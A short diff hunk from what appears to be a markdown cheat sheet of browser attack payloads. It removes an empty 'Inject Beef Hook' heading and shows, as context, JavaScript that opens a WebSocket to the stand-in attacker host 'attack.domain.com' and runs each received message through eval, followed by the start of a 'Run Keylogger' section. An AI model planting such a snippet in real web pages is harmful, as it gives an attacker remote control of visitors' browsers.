@@ -335,8 +335,6 @@ sock = new WebSocket('wss://attack.domain.com')
 sock.onmessage = event => eval(e.data)
 ```
 
-## Inject Beef Hook
-
 ## Run Keylogger
 
 ```
